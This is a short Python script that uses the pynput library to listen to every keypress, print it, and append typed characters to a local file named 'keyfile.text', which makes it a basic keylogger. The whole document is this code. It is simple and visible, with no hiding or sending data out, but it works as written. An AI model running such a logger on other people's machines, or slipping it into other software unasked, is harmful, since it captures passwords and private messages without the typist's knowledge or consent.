from pynput import  keyboard

def keyPresed(key):
    print(str(key))
    with open("keyfile.text",'a') as logkey:
        try:
            char=key.char
            logkey.write(char)
        except:
            print("Error getting char")
if __name__=="__main__":
    listener=keyboard.Listener(on_press=keyPresed)
    listener.start()
    input()